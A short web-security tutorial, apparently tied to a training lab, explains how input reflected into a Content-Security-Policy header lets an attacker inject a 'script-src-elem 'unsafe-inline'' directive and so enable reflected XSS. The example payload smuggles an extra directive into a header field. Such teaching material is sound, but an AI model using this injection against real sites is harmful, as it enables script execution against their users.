# Bypassing CSP With Policy Injection

## Overview

Some applications reflect user input directly into:

```http
Content-Security-Policy
```

headers.

---

# Example

```http
Content-Security-Policy:
script-src 'self';
report-uri /report?token=USER_INPUT
```

---

# Attacker Input

```text
;script-src-elem 'unsafe-inline'
```

---

# Result

```http
script-src 'self';
report-uri ...
script-src-elem 'unsafe-inline'
```

---

# Why It Works

Chrome supports:

```http
script-src-elem
```

which can override:

```http
script-src
```

for script elements.

---

# Attack Flow

```text
Policy Injection
        ↓
Unsafe Inline Scripts Allowed
        ↓
Reflected XSS Executes
```

---

# Related Lab

- Lab30

---

# Key Takeaways

- CSP itself can become an attack surface.
- Reflecting user input into CSP headers is dangerous.